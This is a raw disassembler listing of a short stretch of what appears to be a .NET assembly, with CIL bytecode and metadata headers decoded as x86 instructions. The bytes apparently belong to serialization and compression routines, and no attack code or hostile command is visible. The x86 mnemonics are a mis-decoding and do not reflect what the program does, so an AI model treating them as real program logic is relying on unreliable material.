  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	c0 1d 00 00 23 53 74 	rcrb   $0x74,0x53230000
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 e8                	add    %ch,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 20                	add    %ah,(%eax)
  405a39:	2a 00                	sub    (%eax),%al
  405a3b:	00 23                	add    %ah,(%ebx)
  405a3d:	55                   	push   %ebp
  405a3e:	53                   	push   %ebx
  405a3f:	00 08                	add    %cl,(%eax)
  405a41:	66 00 00             	data16 add %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 18                	add    %bl,(%eax)
  405a51:	66 00 00             	data16 add %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	ea 0a 01 00 00 00 00 	ljmp   $0x0,$0x10a
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 36                	add    %dh,(%esi)
  405ae5:	19 eb                	sbb    %ebp,%ebx
  405ae7:	0f 0a                	(bad)
  405ae9:	00 8a 00 00 16 0a    	add    %cl,0xa160000(%edx)
  405aef:	00 9c 19 6f 18 0a 00 	add    %bl,0xa186f(%ecx,%ebx,1)
  405af6:	86 0f                	xchg   %cl,(%edi)
  405af8:	8b 1d 06 00 26 14    	mov    0x14260006,%ebx
  405afe:	95                   	xchg   %eax,%ebp
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 7d 08             	add    %bh,0x8(%ebp)
  405b04:	00 16                	add    %dl,(%esi)
  405b06:	0a 00                	or     (%eax),%al
  405b08:	9f                   	lahf
  405b09:	10 00                	adc    %al,(%eax)
  405b0b:	16                   	push   %ss
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	0b 18                	or     (%eax),%ebx
  405b10:	8b 1d 06 00 f6 19    	mov    0x19f60006,%ebx
  405b16:	eb 0f                	jmp    0x405b27
  405b18:	0e                   	push   %cs
  405b19:	00 02                	add    %al,(%edx)
  405b1b:	12 ec                	adc    %ah,%ch
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 c1                	add    %al,%cl
  405b21:	18 ec                	sbb    %ch,%ah
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 3b                	add    %bh,(%ebx)
  405b27:	1c 95                	sbb    $0x95,%al
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 26                	add    %ah,(%esi)
  405b2d:	13 dc                	adc    %esp,%ebx
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 5c 10 eb          	add    %bl,-0x15(%eax,%edx,1)
  405b35:	0f 0a                	(bad)
  405b37:	00 17                	add    %dl,(%edi)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c1                	add    %al,%cl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 98 15 12 00 01    	add    %bl,0x1001215(%eax)
  405b4b:	00 eb                	add    %ch,%bl
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	d9 08                	(bad) (%eax)
  405b52:	98                   	cwtl
  405b53:	15 06 00 f8 07       	adc    $0x7f80006,%eax
  405b58:	eb 0f                	jmp    0x405b69
  405b5a:	06                   	push   %es
  405b5b:	00 df                	add    %bl,%bh
  405b5d:	0b dc                	or     %esp,%ebx
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a0 14 c5 17 06    	add    %ah,0x617c514(%eax)
  405b67:	00 9c 05 c5 17 06 00 	add    %bl,0x617c5(%ebp,%eax,1)
  405b6e:	bf 0f 5c 02 06       	mov    $0x6025c0f,%edi
  405b73:	00 e6                	add    %ah,%dh
  405b75:	09 98 15 06 00 53    	or     %ebx,0x53000615(%eax)
  405b7b:	0a 98 15 06 00 03    	or     0x3000615(%eax),%bl
  405b81:	09 3a                	or     %edi,(%edx)
  405b83:	15 6f 00 b8 15       	adc    $0x15b8006f,%eax
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 2b                	add    %ch,(%ebx)
  405b8d:	09 4c 11 06          	or     %ecx,0x6(%ecx,%edx,1)
  405b91:	00 b2 09 4c 11 06    	add    %dh,0x6114c09(%edx)
  405b97:	00 93 09 4c 11 06    	add    %dl,0x6114c09(%ebx)
  405b9d:	00 3a                	add    %bh,(%edx)
  405b9f:	0a 4c 11 06          	or     0x6(%ecx,%edx,1),%cl
  405ba3:	00 06                	add    %al,(%esi)
  405ba5:	0a 4c 11 06          	or     0x6(%ecx,%edx,1),%cl
  405ba9:	00 1f                	add    %bl,(%edi)
  405bab:	0a 4c 11 06          	or     0x6(%ecx,%edx,1),%cl
  405baf:	00 42 09             	add    %al,0x9(%edx)
  405bb2:	4c                   	dec    %esp
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 76 09             	add    %dh,0x9(%esi)
  405bb8:	4c                   	dec    %esp
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 5d 09             	add    %bl,0x9(%ebp)
  405bbe:	03 0c 06             	add    (%esi,%eax,1),%ecx
  405bc1:	00 17                	add    %dl,(%edi)
  405bc3:	09 79 15             	or     %edi,0x15(%ecx)
  405bc6:	06                   	push   %es
  405bc7:	00 e8                	add    %ch,%al
  405bc9:	08 98 15 06 00 cf    	or     %bl,-0x30fff9eb(%eax)
  405bcf:	09 4c 11 06          	or     %ecx,0x6(%ecx,%edx,1)
  405bd3:	00 11                	add    %dl,(%ecx)
  405bd5:	03 95 0b 06 00 96    	add    -0x69fff9f5(%ebp),%edx
  405bdb:	1b eb                	sbb    %ebx,%ebp
  405bdd:	0f 06                	clts
  405bdf:	00 8e 1a eb 0f 06    	add    %cl,0x60feb1a(%esi)
  405be5:	00 e3                	add    %ah,%bl
  405be7:	0b dc                	or     %esp,%ebx
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 d0                	add    %dl,%al
  405bed:	1c 00                	sbb    $0x0,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 16                	add    %dl,(%esi)
  405bf3:	10 fe                	adc    %bh,%dh
  405bf5:	1c 06                	sbb    $0x6,%al
  405bf7:	00 f4                	add    %dh,%ah
  405bf9:	12 fe                	adc    %dh,%bh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 76 0b             	add    %dh,0xb(%esi)
  405c00:	fe                   	(bad)
  405c01:	1c 06                	sbb    $0x6,%al
  405c03:	00 f0                	add    %dh,%al
  405c05:	11 eb                	adc    %ebp,%ebx
  405c07:	0f 0a                	(bad)
  405c09:	00 51 18             	add    %dl,0x18(%ecx)
  405c0c:	5b                   	pop    %ebx
  405c0d:	19 0a                	sbb    %ecx,(%edx)
  405c0f:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  405c12:	5b                   	pop    %ebx
  405c13:	19 0a                	sbb    %ecx,(%edx)
  405c15:	00 a3 0e 5b 19 0a    	add    %ah,0xa195b0e(%ebx)
  405c1b:	00 24 1d 6f 18 0a 00 	add    %ah,0xa186f(,%ebx,1)
  405c22:	2d 08 6f 18 0a       	sub    $0xa186f08,%eax
  405c27:	00 18                	add    %bl,(%eax)
  405c29:	08 6f 18             	or     %ch,0x18(%edi)
  405c2c:	06                   	push   %es
  405c2d:	00 c0                	add    %al,%al
  405c2f:	0c eb                	or     $0xeb,%al
  405c31:	0f 06                	clts
  405c33:	00 c9                	add    %cl,%cl
  405c35:	12 eb                	adc    %bl,%ch
  405c37:	0f 06                	clts
  405c39:	00 3d 10 eb 0f 0a    	add    %bh,0xa0feb10
  405c3f:	00 b8 17 5b 19 0a    	add    %bh,0xa195b17(%eax)
  405c45:	00 52 17             	add    %dl,0x17(%edx)
  405c48:	5b                   	pop    %ebx
  405c49:	19 06                	sbb    %eax,(%esi)
  405c4b:	00 d8                	add    %bl,%al
  405c4d:	17                   	pop    %ss
  405c4e:	eb 0f                	jmp    0x405c5f
  405c50:	06                   	push   %es
  405c51:	00 a8 05 eb 0f 0a    	add    %ch,0xa0feb05(%eax)
  405c57:	00 78 0f             	add    %bh,0xf(%eax)
  405c5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405c5b:	18 0a                	sbb    %cl,(%edx)
  405c5d:	00 ed                	add    %ch,%ch
  405c5f:	0d 8b 1d 0a 00       	or     $0xa1d8b,%eax
  405c64:	35 1b 5b 19 0a       	xor    $0xa195b1b,%eax
  405c69:	00 5e 11             	add    %bl,0x11(%esi)
  405c6c:	00 16                	add    %dl,(%esi)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	76 17                	jbe    0x405c89
  405c72:	2d 11 06 00 93       	sub    $0x93000611,%eax
  405c77:	0a eb                	or     %bl,%ch
  405c79:	0f 06                	clts
  405c7b:	00 11                	add    %dl,(%ecx)
  405c7d:	0e                   	push   %cs
  405c7e:	95                   	xchg   %eax,%ebp
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 df                	add    %bl,%bh
  405c83:	0d eb 0f 0a 00       	or     $0xa0feb,%eax
  405c88:	9c                   	pushf
  405c89:	0d eb 0f 0a 00       	or     $0xa0feb,%eax
  405c8e:	e4 07                	in     $0x7,%al
  405c90:	eb 0f                	jmp    0x405ca1
  405c92:	06                   	push   %es
  405c93:	00 85 14 eb 0f 06    	add    %al,0x60feb14(%ebp)
  405c99:	00 7d 1b             	add    %bh,0x1b(%ebp)
  405c9c:	95                   	xchg   %eax,%ebp
  405c9d:	0b 06                	or     (%esi),%eax
  405c9f:	00 b9 0f 5c 02 06    	add    %bh,0x6025c0f(%ecx)
  405ca5:	00 0b                	add    %cl,(%ebx)
  405ca7:	15 95 0b 0a 00       	adc    $0xa0b95,%eax
  405cac:	52                   	push   %edx
  405cad:	05 6f 18 06 00       	add    $0x6186f,%eax
  405cb2:	b8 01 eb 0f 06       	mov    $0x60feb01,%eax
  405cb7:	00 1a                	add    %bl,(%edx)
  405cb9:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cbd:	00 49 18             	add    %cl,0x18(%ecx)
  405cc0:	3a 15 0a 00 5c 12    	cmp    0x125c000a,%dl
  405cc6:	3a 15 06 00 ed 1c    	cmp    0x1ced0006,%dl
